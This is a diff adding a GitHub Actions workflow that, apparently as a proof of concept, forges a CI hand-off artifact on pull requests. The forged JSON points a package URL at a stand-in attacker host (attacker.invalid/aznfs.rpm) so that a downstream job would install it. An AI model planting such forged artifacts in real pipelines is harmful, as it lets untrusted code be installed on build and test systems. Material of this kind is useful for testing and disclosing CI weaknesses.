@@ -1,0 +1,14 @@
+name: AzFilesSim Phase 2 - Validate against PMC prod
+on:
+  pull_request:
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Forged Phase 2 hand-off
+        run: |
+          printf '%s' '[{"publisher":"ATTACKER-CONTROLLED-ARTIFACT","image":"pwn","sku":"pwn","version":"pwn","region":"pwn","arch":"x86_64","distro_label":"PWN","aznfs_package_url":"https://attacker.invalid/aznfs.rpm"}]' > lisa_jobs.json
+      - uses: actions/upload-artifact@v4
+        with:
+          name: lisa-jobs-${{ github.run_number }}
+          path: lisa_jobs.json
